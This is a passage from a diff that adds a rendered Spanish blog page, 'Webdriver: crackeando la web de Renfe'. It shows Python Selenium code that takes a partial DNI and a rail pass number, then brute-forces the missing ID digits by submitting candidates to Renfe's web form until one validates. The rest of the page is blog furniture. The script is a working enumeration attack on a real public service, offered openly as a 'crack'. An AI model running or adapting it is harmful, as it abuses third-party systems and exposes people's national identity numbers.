+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">usage</span><span class="o">=</span><span class="s">"Given the Abono information, retrieves the rest of the DNI"</span><span class="p">,</span>
+                                 <span class="n">description</span><span class="o">=</span><span class="s">"By Miguel Angel Garcia &lt;miguelangel@magmax.org&gt;"</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-dni'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Initial DNI numbers"</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-abono'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Abono number"</span><span class="p">)</span>
+
+<span class="n">options</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">initial_page</span> <span class="o">=</span> <span class="n">InitialPage</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span>
+    <span class="n">ticket_page</span> <span class="o">=</span> <span class="n">initial_page</span><span class="o">.</span><span class="n">go_ticket_page</span><span class="p">()</span>
+    <span class="n">ticket_page</span><span class="o">.</span><span class="n">select_ticket_type</span><span class="p">()</span>
+    <span class="n">formalization_page</span> <span class="o">=</span> <span class="n">ticket_page</span><span class="o">.</span><span class="n">go_formalization_page</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">dni</span> <span class="ow">in</span> <span class="n">DniGenerator</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">dni</span><span class="p">):</span>
+        <span class="k">print</span> <span class="s">'Testing DNI:'</span><span class="p">,</span> <span class="n">dni</span>
+
+        <span class="n">formalization_page</span><span class="o">.</span><span class="n">reload</span><span class="p">()</span>
+        <span class="n">formalization_page</span><span class="o">.</span><span class="n">write_code</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">abono</span><span class="p">)</span>
+        <span class="n">formalization_page</span><span class="o">.</span><span class="n">write_dni</span><span class="p">(</span><span class="n">dni</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">formalization_page</span><span class="o">.</span><span class="n">is_valid</span><span class="p">():</span>
+            <span class="k">print</span> <span class="s">'The required DNI is'</span><span class="p">,</span> <span class="n">dni</span>
+            <span class="k">break</span>
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">driver</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre>
+</div>
+          </div>
+          <br><div>
+            <nav><span class="author">
+                <span class="glyphicon glyphicon-user"></span> 
+                <span>Publicado:Miguel Ángel García</span>
+              </span>
+               
+
+              
+              <span class="dateline">
+                <span class="glyphicon glyphicon-calendar"></span> 
+                <time class="published dt-published" datetime="2013-11-16T00:00:00+00:00" title="2013-11-16">2013-11-16</time></span>
+               
+              <span class="tags">
+                <span class="glyphicon glyphicon-tags"></span> 
+                <a class="label label-primary p-category" href="/categories/crack/" rel="tag">crack</a>
+                <a class="label label-primary p-category" href="/categories/python/" rel="tag">python</a>
+                <a class="label label-primary p-category" href="/categories/selenium/" rel="tag">selenium</a>
+                <a class="label label-primary p-category" href="/categories/webdriver/" rel="tag">webdriver</a>
+              </span>
+                      <ul class="pager">
+<li class="previous">
+              <a href="/blog/lamp-con-puppet/" rel="prev" title="LAMP con Puppet">
+                <span class="glyphicon glyphicon-arrow-left"></span>
+                Publicación anterior
+              </a>
+            </li>
+            <li class="next">
+              <a href="/blog/usando-git3/" rel="next" title="Usando Git(3): Internals">
+                Siguiente publicación
+                <span class="glyphicon glyphicon-arrow-right"></span>
+              </a>
+            </li>
+        </ul>
+<div style="margin-left: auto; margin-right: auto;">
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:inline-block;width:728px;height:90px" data-ad-client="ca-pub-1887364423515042" data-ad-slot="4236077264"></ins>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+</div>
+            </nav>
+</div>
+          <section class="comments"><h2>Comentarios</h2>
+                            <div id="disqus_thread"></div>
+        <script>
+        var disqus_shortname ="magmax",
+            disqus_url="http://magmax.org/blog/webdriver-practico/",
+        disqus_title="Webdriver: crackeando la web de Renfe",
+        disqus_identifier="cache/posts/webdriver-practico.html",
+        disqus_config = function () {
+            this.language = "es_ES";
+        };
+        (function() {
+            var dsq = document.createElement('script'); dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script><noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+</noscript>
+    <a href="//disqus.com" class="dsq-brlink" rel="nofollow">Comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+          </section></article><script>var disqus_shortname="magmax";(function(){var a=document.createElement("script");a.async=true;a.src="//"+disqus_shortname+".disqus.com/count.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)}());</script>
+</div>
+      <aside class="sidebar col-md-3"><div>
+<section class="panel panel-default"><div class="panel-body">
+    <div id="recentcomments" class="dsq-widget">
+      <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:inline-block;width:180px;height:150px" data-ad-client="ca-pub-1887364423515042" data-ad-slot="7479875641"></ins>
+      <script>
+        (adsbygoogle = window.adsbygoogle || []).push({});
+      </script>
+</div>
+  </div>
+</section>
+</div>
+          <div>
+<section class="panel panel-default"><div class="panel-heading">
+    <h3 class="panel-title">Last comments</h3>
+  </div>
+  <div class="panel-body">
+    <div id="disqus_last_comments" class="dsq-widget">
+      <script type="text/javascript" src="http://magmax.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=0&amp;avatar_size=32&amp;excerpt_length=150">
+      </script>
+</div>
+  </div>
+</section>
+</div>
+          <div>
+<section class="panel panel-default"><div class="panel-heading">
+    <h3 class="panel-title">GitHub Repos</h3>
+  </div>
+  <div class="panel-body">
+    <ul id="gh_repos" class="list-unstyled">
+<li class="loading">Status updating…</li>
+    </ul>
+</div>
+  <div class="panel-footer">
+    <a href="https://github.com/magmax">@magmax</a> on GitHub
+  </div>
+</section>
+</div>
+      </aside>
+</div>
+
+    <footer>
+      Contents © 2009-2016 <a href="mailto:">Miguel Ángel García</a> 
+<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/2.5/es/">
+<img alt="Creative Commons License BY-NC-SA" style="border-width:0; margin-bottom:12px;width:80px;height:15px;vertical-align:middle" src="https://i.creativecommons.org/l/by-nc-sa/2.5/es/80x15.png"></a>; Using <a href="/stories/credits/">a lot of free software</a>
+      
+    </footer>
+</div>
+</div>
+
+
+
+
+<script data-main="/assets/js/main" src="/assets/js/libs/require/require.min.js"></script><script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-9308241-3', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+</html>
